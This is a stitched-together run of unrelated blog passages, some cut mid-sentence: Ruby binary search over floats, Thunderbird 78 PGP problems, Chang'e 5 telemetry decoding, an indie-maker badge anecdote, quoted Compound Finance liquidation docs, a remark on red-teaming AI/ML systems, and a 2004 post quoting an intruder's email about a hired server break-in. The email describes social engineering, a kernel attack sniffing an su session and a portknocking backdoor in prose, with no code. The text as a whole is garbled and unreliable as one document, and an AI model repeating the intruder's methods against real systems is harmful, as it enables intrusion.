src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/one_point_five.png"> </figure> <p>Oh look, it’s 1.5!</p> <p>Using this same technique, you can now find out why the binary search examines <code>1.6759759912428246e+154</code> and <code>1.5921412270130977e+77</code> after this. This is left as an exercise for the reader.</p>  <p>The reason why this works is simple once you wrap your head around it. It’s because the more significant bits are always in a more significant position (than the bits to the right of it) in floating-point numbers. This is obviously true for the significand. But this is also true for the exponent because the next power of 2 can’t be reached by just increasing the significand, the exponent has to be increased. So thus a larger exponent will always mean that the floating-point number has a larger magnitude.</p> <p>Once this is true, we can see why binary search works using this technique. It works because if <code>x</code> and <code>y</code> are doubles and <code>x &gt; y</code>, then we have shown that <code>double_as_int64(x) &gt; double_as_int64(y)</code> is also true. This is the requirement for binary search because the values remain strictly increasing (<em>technically</em> binary search only requires monotonically increasing, but strictly increasing is a tighter guarantee than monotonically increasing).</p>  <p>Ruby’s binary search in a range uses a clever technique to perform binary search when the endpoints are doubles while maintaining a worst-case runtime of <code>O(n log n)</code>. In fact, this technique isn’t specific to Ruby and can be used in any language that uses IEEE 754 floating-point numbers.</p>  </div> </article> </div></div>]]>

<p>I am writing this post because Thunderbird 78.x has issues for advanced PGP users. But first, I’d like to say a few words to all the frustrated users: I hear you, I too am displeased with this update, but while it’s easy to complain and rant, we should look at the bright side and still be grateful that Mozilla thought of including PGP, as it makes it more accessible to users that are not as tech-savvy. It’s always good to push for privacy and having it built-in, and easy to use! But, there are issues with the new built-in PGP that we should talk about…</p>
<h2>Preface</h2>
<p>You know, as I stated in <a href="https://www.sindastra.de/p/1566/open-letter-why-it-security-is-obvious-to-me/" target="_blank" rel="noreferrer noopener">my open letter</a>: Security and privacy is important to me. Of course, this means I use PGP, or more specifically, GnuPG with smartcards.</p>
<p>I like FOSS, especially if it’s cross-platform as I use Linux, Mac and Windows (alphabetical order, no preference stated) and it’s great to be able to use your software on all your machines across all systems, and for free! The popular email client, Thunderbird is one such application that meets these criteria, and so is GnuPG (or GPG for short), a popular application that implements the OpenPGP specification.</p>
<p>GnuPG has a ton of features, among those features is the support of smartcards. Keep this in mind.</p>
<p>Now, let’s take a look at the situation in Thunderbird before, and then since version 78.x and what we can do about it.</p>
<h2>The situation <em>before</em> version 78.x</h2>
<p>Before Thunderbird 78.x (namely 68.x), if you had both Thunderbird and GnuPG installed, all you had to do was to install a Thunderbird addon known as Enigmail. This addon basically bridged the gap between Thunderbird and GnuPG, and essentially allowed you to experience full PGP within Thunderbird.</p>
<p>Of course this meant you had to install GnuPG on your system, then an addon, then generate and manage keys, and – although powerful – it was overall not as user-friendly as it could be.</p>
<p>So, even I as an advanced user, was excited that Thunderbird would come with PGP built-in in 78.x as I thought they might ship it with GnuPG, and something like Enigmail but built-in and maybe more user-friendly. At the very least having no third-party things to install sounds better. And convenience is nice, right? But I was wrong.</p>
<h2>The situation <em>since</em> version 78.x</h2>
<p>You see, Mozilla, the people behind Thunderbird did not ship it with GnuPG. Instead, they use a library called RNP. This library does not provide full-featured PGP.</p>
<p>RNP does for example, not support the use of smartcards. Which, basically means no PGP at all for me or any user with smartcards. Thunderbird does currently also not support using subkeys with detached primary key. Which means any advanced user that did a proper, more secure PGP setup, can also not use PGP with Thunderbird for the time being.</p>
<p>So, you might think to yourself: Just install Enigmail! Well, here’s the thing: Enigmail does not work with Thunderbird 78.x!</p>
<p>Thunderbird 78.x has hidden settings in the advanced configuration editor, that you can use to tell it to use external GnuPG, which is great! Except it doesn’t really work…</p>
<p>It did not work for me, and I tried many things, on different systems, followed different guides (including the official Mozilla Wiki), and heard the same from other users through the fediverse. For a friend of mine, setting up Thunderbird to use external GnuPG on Windows made it outright crash whenever trying to open a PGP encrypted email!</p>
<p>And this is basically the problem. On one hand, Mozilla was cool enough to include (some) PGP in Thunderbird which in theory makes it more accessible as you can generate and use keys with a few clicks, which is also good for us advanced users as we can then email privately with friends that would otherwise be unable to use PGP. But on the other hand the execution was bad in such a way that it stabs all the advanced users that were already using (advanced setups of) PGP.</p>
<h2>What to do about it (for now)</h2>
<p>Honestly, my advice to anyone that uses Thunderbird and depends on advanced PGP (smartcard etc.) for now: Just downgrade to Thunderbird 68.x and install Enigmail. It seems it will still receive updates for now and there’s no forced update to 78.x (yet). I just tried, and got an (undocumented) update for the 68.x version (namely 68.12.1).</p>
<p>Let’s hope they will keep providing security updates for 68.x until they have (hopefully) sorted out PGP in version 78.x so that we will eventually be able to upgrade, but without being pushed into a broken environment prematurely.</p>
<p>You can get the latest version of 68.x from here (official download link): <a href="https://download-installer.cdn.mozilla.net/pub/thunderbird/releases/68.12.1/" target="_blank" rel="noreferrer noopener nofollow">https://download-installer.cdn.mozilla.net/pub/thunderbird/releases/68.12.1/</a></p>
<p>Please note that, Thunderbird will notice that the current configuration is from a newer version after downgrading, which you cannot use. This will result in a little window informing you about that on startup. Your only two options are to quit the application, or to create a new (configuration) profile. This means you will have to set up your accounts again but at least PGP will work again (with Enigmail and GnuPG)!</p>
<p>Thank you and goodnight! :D</p>
<h2>UPDATE 2020-NOV-29</h2>
<p>Hey everyone, this article drew many visitors after it was posted on HN (thanks, kind stranger!) and I did read through the comments (both here and some on HN)!</p>
<p>I’d like to address some things:</p>
<ol><li>I saw a tl;dr on HN which mentioned the downgrade recommendation, but without the details. As I understood it, it got criticized as you need to stay up to day for security reasons. And I agree with that. However, I’d like to make it clear that I only recommended a downgrade for now, as it seems the 68.x branch is still getting updates, as I experienced myself. As long as Thunderbird does not drop support for 68.x, and does not force an upgrade to 78.x, I think downgrading is fine. When Thunderbird finally drops support for 68.x, I would of course not recommend staying on outdated software.</li><li>When Thunderbird 68.x reaches EOL, and if 78.x hasn’t sorted out the issues with PGP by then, an alternative, if you’re on Windows and have MS Outlook, would be the free GpgOL extension for Outlook that comes bundled with Gpg4win. Please note that I don’t have experience with this myself, but I’d like to point it out anyway in case it’s useful. There’s also a (paid) Apple Mail extension that comes with gpgtools, however I do not recommend it unless you don’t mind paying for each new major version every year.</li><li>Thank you for informing me that Thunderbird is not part of Mozilla Corporation anymore, but as I understood it, still part of Mozilla Foundation. So, I guess in that case I’m addressing the Mozilla foundation. If this is still wrong, please let me know.</li></ol>
<p>PS I was exhausted and it was late at night when I originally wrote this article, and I wasn’t fully happy with it but people seemed to like it and had very constructive feedback which really helps. Thank you all for stopping by and reading it! &lt;3</p>

<p><a href="https://en.wikipedia.org/wiki/Chang%27e_5">Chang’e 5</a> is a Chinese lunar sample return mission. It was launched a few days ago on 2020-11-23 from <a href="https://en.wikipedia.org/wiki/Wenchang_Satellite_Launch_Center">Wenchang</a> and <a href="https://twitter.com/coastal8049/status/1331782149490413568">is estimated</a> to perform lunar orbit injection on Saturday. Since then, a number of Amateurs such as <a href="https://twitter.com/usa_satcom/status/1331092113069543425">USA Satcom</a>, <a href="https://twitter.com/uhf_satcom/status/1331317024992210944">Paul Marsh M0EYT</a>, <a href="https://twitter.com/coastal8049/status/1331138035891650560">Scott Tilley VE7TIL</a>, <a href="https://twitter.com/supertrack_it/status/1331354629146365953">Fer IW1DTU</a> and others have been receiving the X-band signals from the spacecraft and posting reports over on Twitter. Meanwhile, <a href="http://r00t.cz/">r00t.cz</a> has been working in <a href="https://twitter.com/r2x0t/status/1331097492482646016">decoding the frames</a>, which has led him to the amazing achievement of being able to <a href="http://www.r00t.cz/Sats/Change5">retrieve a short video</a> from the signal.</p>



<p>In this post I will look at some of the frames demodulated by USA Satcom and Paul during the first couple of days of the mission. The frame structure has many similarities with Tianwen-1, which I have described in several posts, such as <a href="https://destevez.net/2020/08/tianwen-1-telemetry-framing-and-data/" data-type="post" data-id="8773">here</a> and <a href="https://destevez.net/2020/08/tianwen-1-high-speed-data-signal/" data-type="post" data-id="8871">here</a>. However, there are some interesting differences.</p>



<h4>Low data rate telemetry</h4>



<p>The low data rate telemetry signal is a PCM/PSK/PM signal with a subcarrier rate of 65536 Hz and a baudrate of 2048 baud. The coding is CCSDS concatenated frames with a Reed-Solomon codeword size of 252 bytes, so that a frame takes 2 seconds to transmit. The Reed-Solomon code uses the dual basis, as specified in the <a href="https://public.ccsds.org/Pubs/131x0b3e1.pdf">TM Synchronization and Channel Coding</a> blue book. This is very similar to Tianwen-1’s low rate signal. The only differences are that Tianwen-1 uses a baudrate of 16384 baud (so frames take 0.25 seconds to transmit), and the conventional Reed-Solomon basis (which is not standard CCSDS).</p>



<p>Chang’e 5 has been seen to use <a href="https://twitter.com/coastal8049/status/1331782140900503556">a number of different frequencies</a> at X-band. Here I will be looking at some frames received by USA Satcom on 2020-11-24 between 4 and 6 UTC.</p>



<p>The frames are CCSDS <a href="https://public.ccsds.org/Pubs/732x0b3e1.pdf">AOS frames</a> coming from spacecraft ID 91. The spacecraft ID is quite relevant, because the spacecraft has different detachable modules: a service module, a return module, a lander, and an ascent module. Most likely each of these modules uses a different spacecraft ID, and we are in fact seeing data from different spacecraft IDs.</p>



<p>Two virtual channels are in use. Virtual channel 1 contains most of the data (a total of 5888 frames), while virtual channel 2 contains only 5 frames.</p>



<p>The AOS frames in both virtual channels have an insert zone that is 8 bytes long. The purpose of the first 4 bytes is unknown, while the last 4 bytes are a little-endian timestamp encoded as the number of seconds elapsed since 2012-08-01 00:00:00 UTC. It is interesting to compare this timestamp format with <a href="https://destevez.net/2020/07/more-about-the-tianwen-1-timestamps/" data-type="post" data-id="8734">that used in Tianwen-1</a>, which uses a 48 bit big-endian timestamp that encodes 100us units since 2016-01-01 00:00:00 Beijing time. The change from big-endian to little-endian is peculiar, since somehow the CCSDS protocols favour big-endian fields, and the change from a Beijing time epoch to a UTC epoch is also an interesting curiosity.</p>



<p>The M_PDU protocol is used to multiplex CCSDS <a href="https://public.ccsds.org/Pubs/133x0b2e1.pdf">Space Packets</a> in the AOS frames.</p>



<p>The figure below shows the timestamps and virtual channel frame counter in the frames from virtual channel 1. The gaps correspond to time gaps between the different files provided by USA Satcom.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1.png"><img loading="lazy" width="625" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1.png 625w, https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1-300x186.png 300w" sizes="(max-width: 625px) 100vw, 625px"></a></figure>



<p>The Space Packets in virtual channel 1 use many different APIDs. I have been browsing through the plots of the data in each of the APIDs and they look reminiscent of Tianwen-1. There are many analogue telemetry channels, but I haven’t been able to spot any that has an obvious meaning, and there doesn’t seem to be any floating point data as in Tianwen-1. Here I show a few of the most interesting APIDs.</p>

<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_apid524.png"><img loading="lazy" src="https://destevez.net/wp-content/uploads/2020/11/ce5_apid524-644x654.png" alt="" width="483" height="491" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_apid524-644x654.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid524-295x300.png 295w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid524-768x780.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid524.png 903w" sizes="(max-width: 483px) 100vw, 483px"></a></figure>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_apid815.png"><img loading="lazy" src="https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-644x649.png" alt="" width="483" height="487" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-644x649.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-298x300.png 298w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-150x150.png 150w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-768x774.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815-100x100.png 100w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid815.png 910w" sizes="(max-width: 483px) 100vw, 483px"></a></figure>



<p>The five frames in virtual channel 2 were transmitted consecutively, perhaps in response to a telecommand. Each of them contains a single Space Packet from APID 897 that occupies all the frame.</p>



<p>The data from these Space Packets looks like some kind of file download or memory dump. The first 8 bytes contain three fixed bytes that maybe identify the file or the region of memory followed by a 5 byte little-endian chunk counter. The transfer here uses only 5 chunks, and most of the data in the last chunk is filled with <code>0xaa</code> padding bytes. The figure below shows the data in this transfer, with one chunk per row. The data clearly shows patterns, but I have no idea what it is.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_vc2.png"><img loading="lazy" width="644" height="187" src="https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-644x187.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-644x187.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-300x87.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-768x223.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_vc2.png 864w" sizes="(max-width: 644px) 100vw, 644px"></a><figcaption>Chang’e transfer in APID 897</figcaption></figure>



<p>The code and data used in this part of the post, including the full plots of all the APIDs, can be found in <a href="https://github.com/daniestevez/jupyter_notebooks/blob/master/CE5/CE-5%20frame%20analysis.ipynb">this Jupyter notebook</a>.</p>



<h4>High data rate telemetry</h4>



<p>The high data rate telemetry uses 2.5Mbaud BPSK <a href="https://twitter.com/r2x0t/status/1331351055972642818">according to r00t</a>. Coding is, as in the case of <a href="https://destevez.net/2020/08/tianwen-1-high-speed-data-signal/">Tianwen-1 high data rate long frames</a>, concatenated CCSDS frames using four interleaved Reed-Solomon codewords (with 255 bytes each).</p>



<p>The data used here is a short segment received by Paul on 2020-11-24 between 20:52 and 20:58 UTC at 8455 MHz. It is quite interesting to see the errors corrected by the Reed-Solomon decoder, which show large variability but indicate that Paul has more than enough SNR margin to decode the signal.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_rs.png"><img loading="lazy" width="612" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_rs.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_rs.png 612w, https://destevez.net/wp-content/uploads/2020/11/ce5_rs-300x190.png 300w" sizes="(max-width: 612px) 100vw, 612px"></a></figure>



<p>The data consists of AOS frames from spacecraft ID 26 (note this is a different spacecraft ID to the one in the low rate data used in the previous part). Virtual channels 38 and 63 are in use, with 18396 and 51850 frames respectively.</p>



<p>In contrast to the AOS frames used for the low data rate telemetry, here the AOS insert zone is only 6 bytes long, with 2 unknown bytes that always contain the value <code>0xf0f0</code> followed by a 4 byte timestamp using the same format as in the low data rate frames. There is no M_PDU. The data follows directly after the insert zone.</p>



<p>Virtual channel 63 consists solely of idle data. This is a standard feature of the AOS Space Data Link protocol called OID channel (only idle data), which is always virtual channel 63. The data in the frames of this virtual channel is filled with <code>0xaa</code> padding.</p>



<p>The figure below shows the timestamps and frame counter in the OID channel.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid.png"><img loading="lazy" width="644" height="385" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid-644x385.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid-644x385.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid-300x179.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid.png 647w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>The frame loss computed from the jumps in the virtual channel frame counter shows that very few frames were lost. The large jumps near the end correspond to a gap in Paul’s data, which is divided into two files.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss.png"><img loading="lazy" width="625" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss.png 625w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss-300x186.png 300w" sizes="(max-width: 625px) 100vw, 625px"></a></figure>



<p>Virtual channel 38 is quite interesting. I <a href="https://twitter.com/ea4gpz/status/1331711668045434886">joked on Twitter</a> that it resembles the Inception film, because it has several layers of CCSDS protocols. The timestamps in this virtual channel are quite weird, since comparing with the timestamps from the OID channel they seem to run too fast and extend into the future. There is no way that the 18396 frames in this virtual channel are able to span one hour and 30 minutes as shown here. I’m not sure what’s happening with this.</p>

<p>This shows the first frames in virtual channel 38. We can discern the AOS headers, then two parts that seem quite similar, and then a large section of <code>0xaa</code> padding.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data.png"><img loading="lazy" width="644" height="173" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-644x173.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-644x173.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-300x80.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-768x206.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data.png 877w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>The data field of each of these AOS frames contains a single Space Packet, which is embedded directly without using M_PDU. The length of the Space Packet is 510 bytes including its header, which explains why the end of the AOS frame is filled with padding. These Space Packets belong to APID 92.</p>



<p>The contents of each of these Space Packets are two back to back AOS frames, which explains the repetition in the figure below. The AOS frames belong to spacecraft ID 197 (yet a new spacecraft!), virtual channel ID 52, and have the replay flag set.</p>



<p>The insert zone of these replayed AOS frames contains three unknown bytes followed by a 32 bit timestamp in the usual format. The timestamps and frame counts are shown below. The replay data is actually from the previous day, starting just 30 minutes after launch.</p>



<figure><img loading="lazy" width="631" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_replay_fc.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_replay_fc.png 631w, https://destevez.net/wp-content/uploads/2020/11/ce5_replay_fc-300x184.png 300w" sizes="(max-width: 631px) 100vw, 631px"></figure>



<p>These AOS frames have a CRC-16, in contrast with the usual AOS frames, which rely on the Reed-Solomon parity check bytes for error detection. The CRC of all the replay frames I’ve decoded is correct.</p>



<p>These replay AOS frames use M_PDU, and contain Space Packets from APIDs 301 and 2047 (the idle APID). As expected, the idle APID packets contain only zeros. The data in APID 301 is shown in the figure below. I am not sure how to interpret it, but some of the structure is evident.</p>

    <p>Oh boy, am I glad that I trusted my gut feeling.</p>

<p>You probably know the type of badge I’m talking about.  It’s tiny, lives in the lower-right corner of the screen and says something like “by Jakob Greenfeld”.</p>

<p><img src="https://jakobgreenfeld.com/images/tinybadge.png" alt=""></p>

<p>But not too many indie makers seem to be using it. I hesitated myself. It makes the fact that the project is an indie project immediately obvious. Hence the project will be perceived as less professional. Also it possibly distracts customers and might annoy some of them.</p>

<p>So there are lots of reasons why you shouldn’t include a badge and not really many objective ones why you should.</p>

<p>Nevertheless, I decided to include one on all of my pages. The main reason was that I instantly like a page more if it has such a badge (and not some annoying chat widget or whatever.) It shows me directly that I’m a looking at a project by a fellow indie maker. I really think of the badge as some kind of membership card for the indie maker club.</p>

<p>Okay, enough of this. You’re probably not here to hear about my sentimental feelings.</p>

<p>So let’s get back to the main story.</p>

<p>Now what happened is that yesterday I’m getting lots of new followers even though I didn’t write a single tweet. Also I’m getting lots of Gumroad notifications.</p>

<p><em>“You have a new subscriber for <a href="https://gumspy.com/">Gum Spy</a>”, “You have a new subscriber for Gum Spy”, “You have a new subscriber for Gum Spy”….</em></p>

<p>Cool, but strange. Something must be happening but I have no idea what.</p>

<p>Then I get a DM from <a href="https://twitter.com/TrevMcKendrick">Trevor McKendrick</a> (Chief of Staff @ Lambda School).</p>

<p><img src="https://jakobgreenfeld.com/images/dm.png" alt=""></p>

<p>Apparently, Sam Parr and Shaan Puri talked about me on <a href="https://www.myfirstmillionpodcast.com/">their podcast</a>. The show has hundreds of thousands of listeners. I’m just a guy with 600 Twitter followers who launched his first paid product 4 weeks ago. This is insane.</p>

<p>In the <a href="https://open.spotify.com/episode/496MjbRwFPa52tqdJBvC3m?si=QrBc05p3TlOgEFDl9iqRNA">episode</a>, Shaan mentions that he discovered my stuff because of a tiny badge in the lower-right corner on the Gum Spy landing page.</p>

<p>Without the badge, my site would’ve been just another faceless project. But thanks to the badge, Shaan was quickly able to see that I’m a “build in public type of guy”, that I’m currently doing a <a href="http://jakobgreenfeld.com/mba">Bootstrap MBA learning experiment</a>,  that I recently launched similar projects. And this is why he decided to give me a shoutout on the show.</p>

<p>You probably thought the title of this post is clickbait. It’s not.</p>

<p>I really made dozens of sales (still counting) and got hundreds of new <a href="https://twitter.com/jakobgreenfeld">Twitter followers</a> and <a href="https://productideas.substack.com/">newsletter subscribers</a> only thanks to the tiny badge.</p>

<p>So what’s the takeaway? Use a “made by” badge on your sites, obviously.</p>

<p>And no worries, I’m not trying to sell you some “made by” badge service. The code for the badge I’m using is <a href="https://gist.github.com/levelsio/9c531122e557da6282458bbc2a8e2aff">freely available</a> (thanks <a href="https://levels.ui/">Pieter</a>!) and is so simple that really anyone can use it.</p>

Unlike typical protobufs endpoints, the Compound endpoints support JSON for input and output in addition to the protobufs binary format. To use JSON in both the input and the output, specify the headers&nbsp;“Content-Type: application/json”and&nbsp;“Accept: application/json”in the request.</p><cite><a href="https://compound.finance/developers/api#compound-api">https://compound.finance/developers/api#compound-api</a></cite></blockquote>



<blockquote><p>API keys are currently optional, and are included in the HTTP header&nbsp;compound-api-key; you can request keys from Compound in the #development channel of our&nbsp;<a href="https://discord.gg/874ntdw" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">Discord</a>&nbsp;server.

<blockquote><p>The Account API retrieves information for various accounts which have interacted with Compound. You can use this API to pull data about a specific account by address, or alternatively, pull data for a list of unhealthy accounts (that is, accounts which are approaching under-collateralization).</p><cite><a href="https://compound.finance/developers/api#AccountService">https://compound.finance/developers/api#AccountService</a></cite></blockquote>

<blockquote><p><strong>Exponential Math</strong></p><p>The Compound smart contracts use a system of exponential math in order to represent fractional quantities with sufficient precision. Throughout the documentation and code we make reference to mantissas, which are unsigned integers scaled up by a factor of 1e18 from their nominal value. By using mantissas within our contracts, we may perform basic mathematical operations like multiplication and division at a higher resolution than working with the unscaled quantities directly as integers. To gain a better understanding of how this works, see&nbsp;<a rel="noreferrer noopener" href="https://github.com/compound-finance/compound-money-market/blob/master/contracts/Exponential.sol" target="_blank">Exponential.sol</a>.</p><cite><a href="https://compound.finance/developers#exponential-math" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">https://compound.finance/developers#exponential-math</a></cite></blockquote>

<h3>AccountResponse</h3>



<blockquote><p><code>close_factor</code>: The portion of an outstanding borrow that can be closed in a liquidation, which is a percentage of the total underlying borrow balance. For example if the close factor is 0.1, then an account in liqudation is liable to have 10% of its borrows liquidated.</p><cite><a href="https://compound.finance/developers/api#compound-api" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">https://compound.finance/developers/api#compound-api</a></cite></blockquote>



<blockquote><p><strong>Close Factor</strong>: The portion of a borrow in a single market that may be closed by a liquidator during a single liquidation. For example, if Joe borrows 100 ZRX and the close factor is 0.3, then a liquidator may close 30 ZRX. The close factor is globally defined across all markets.</p><cite><a href="https://compound.finance/developers#glossary" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">https://compound.finance/developers#glossary</a></cite></blockquote>



<h4>Close Factor</h4>



<p>The percent, ranging from 0% to 100%, of a liquidatable account’s borrow that can be repaid in a single liquidate transaction. If a user has multiple borrowed assets, the closeFactor applies to any single borrowed asset, not the aggregated value of a user’s outstanding borrowing.</p>



<h5>Comptroller</h5>



<pre><code>function closeFactorMantissa() view returns (uint)</code></pre>



<ul><li>RETURN&nbsp;:&nbsp;The closeFactor, scaled by 1e18, is multiplied by an outstanding borrow balance to determine how much could be closed.</li></ul>



<p>Can multiple transactions, each liquidating 0.3, be sent sequentially? For example, the first transaction liquidates 0.3, and the health is still &lt; 1.0. Can a second transaction liquidate another 0.3? Each liquidation also removes 1.05 collateral.</p>



<blockquote><p><strong>Counterproductive Incentives</strong><br>The protocol includes a mechanism to incentivize arbitrageurs to repay loans that are under-collateralized. This should increase the borrower’s liquidity, reducing the risk of insolvency. After all, that is the point of the mechanism. However, there is a threshold where the incentives reverse and the liquidation mechanism actually pushes borrowers towards insolvency.</p><cite><a href="https://blog.openzeppelin.com/compound-audit/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">https://blog.openzeppelin.com/compound-audit/</a></cite></blockquote>



<blockquote><p><code>liquidation_incentive</code>: The amount of extra collateral that will be seized to incentivize liquidation. For example, an incentive of 1.05 implies that a liquidator will receive a 5% bonus on the exchange of collateral during a liquidation.</p><cite><a href="https://compound.finance/developers/api#compound-api" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">https://compound.finance/developers/api#compound-api</a></cite></blockquote>



<blockquote><p><strong>Liquidation Incentive</strong>: The additional collateral given to liquidators as an incentive to perform liquidation of underwater accounts. For example, if the liquidation incentive is 1.1, liquidators receive an extra 10% of the borrowers collateral for every unit they close. The liquidation incentive is globally defined across all markets.</p><cite><a rel="noreferrer noopener" href="https://compound.finance/developers#glossary" target="_blank">https://compound.finance/developers#glossary</a></cite></blockquote>



<blockquote><p><code>accounts</code>: The list of accounts (see Account below) matching the requested filter, with the associated account and cToken data.</p><cite><a rel="noreferrer noopener" href="https://compound.finance/developers/api#compound-api" target="_blank">https://compound.finance/developers/api#compound-api</a></cite></blockquote>



<h4>Get Account Liquidity</h4>



<p>Within the Compound Protocol, account liquidity is defined as the total estimated ether value of an account’s collateral (supply balances multiplied by the protocol&nbsp;<a href="https://compound.finance/developers/comptroller#collateral-factor" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">collateral factor</a>, minus the total value of that account’s borrow balances. These values are calculated using only the markets which the account has&nbsp;<a href="https://compound.finance/developers/comptroller#enter-markets" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">entered</a>&nbsp;into.</p>



<p>Users who do not have positive account liquidity do not have the ability to withdraw or borrow any assets until they bring their account liquidity back positive by supplying more assets or paying back outstanding borrows.</p>



<p>Sometimes account liquidity refers to a single signed value, rather than two unsigned values – however the Compound Protocol only deals with unsigned integers. A negative value for account liquidity also means the user is subject to liquidation to bring their account liquidity back to zero.</p>



<h5>Comptroller</h5>



<pre><code>function getAccountLiquidity(address account) view returns (uint, uint, uint)</code></pre>



<ul><li>account&nbsp;:&nbsp;The account whose liquidity shall be calculated.</li><li>RETURN&nbsp;:&nbsp;Tuple of values (error, liquidity, shortfall). The error shall be 0 on success, otherwise an&nbsp;<a href="https://compound.finance/developers/comptroller#comptroller-error-codes">error code</a>. A non-zero liquidity value indicates the account has available&nbsp;<a href="https://compound.finance/developers/comptroller#account-liquidity">account liquidity</a>. A non-zero shortfall value indicates the account is currently below his/her&nbsp;<a href="https://compound.finance/developers#collateral">collateral requirement</a>&nbsp;and is subject to liquidation. At most one of liquidity or shortfall shall be non-zero.</li></ul>

<p>As you can see there are many machine learning specific attacks, but also a lot of “typical” red teaming techniques that put AI/ML systems at risk. For instance well known attacks such as SSH Agent Hijacking, weak access control and widely exposed credentials will likely help achieve objecives during red teaming operations.</p>
<p>Hope the content is helpful and maybe even inspiring for others to start building, breaking and better protecting AI/ML systems.</p>

	<p>
	<b>From:</b> "SERIOUS SITUATION" &lt;[fake email address]&gt;<br>
	<b>To:</b> sean@conman.org<br>
	<b>Subject:</b> Referencing: <a href="http://boston.conman.org/2004/09/14.1">http://boston.conman.org/2004/09/14.1</a><br>
	<b>Date:</b> Sun, 19 Sep 2004 01:18:21 -0500<br>
	</p>

	<p>Sean,</p>

	<p>My apologies if any of your time, sanity, peace, or data was lost
	due to the event. But surely I will clarify any of your doubts with
	some information about the attacks.</p>

	<p>It was a hired job. I was sent to take down the majority of <span>XXXXXXXXX</span>'s servers/content and actually
	infiltrated the <span>XXXXXXXXX</span> network
	<em>physically</em>.  I flew to <span>XXXXXXXXXX</span>,
	and social engineered my way onto client machines. From there I
	essentially attained enough credentials that left me able to access
	the companies client database(s), affiliation(s) database(s) … oh
	and logins to your servers.</p>

	<p> … However, your <code>swift.conman.org</code> (or Mark's
	rather) was running gentoo with some modifications including tighter
	suid access on vulnerable binaries on the system, and common
	misconfigurations through the system was also fixed.  Finally, using
	a kernel attack to sniff the memory of a recent “su” execution,
	root was caught.  As I looked around and tried to asses the
	situation, I suppose Mark witnessed (from another location perhaps)
	my SSH login attempts to servers he had access to.  In any case,
	<code>switch.conman.org</code> 
	was unnessesary but I'm glad Mark's paranoia took it down, because
	it would have left much more work for me to do on game day.  By the
	way, I still had access to <code>swift.conman.org</code> even after
	it was patched, I had all known system credentials plus there was a
	kernel entry using portknocking. so if the server was fixed up and
	left on, even during Mark's paranoia it still would have been a
	successful attack on my part.  So yes, the compromise of
	<code>swift.conman.org</code> and the other servers are related.  I
	was sloppy, and Mark is paranoid … I guess I lost that one.</p>

</blockquote>

<p>I certainly wasn't expecting <em>this</em>.</p>

<p>There was more, including details about the company we're hosting the
sites for, even more details about the attack (but really, when it's an
inside job, it's all the more harder to prevent) and some details about
harding servers to prevent such an attack from happening (like a link to <a href="http://www.grsecurity.net/">grsecurity.net</a> which
I have to check out, but most of the other stuff is common sense).  But this
does answer a bunch of questions about the past few weeks of cracking
activity.</p>

<p>And how do I know for a fact that is guy is telling the truth?  He also
included the passwords to several accounts on <code>swift.conman.org</code>. 
To me, that's pretty conclusive evidence.</p>

<p>A new thing I've learned though—<a href="http://www.portknocking.org/">portknocking</a>, something else to look
into.</p>

<blockquote>

	<p>Anyway, I'm typing this as I sit across the street from a
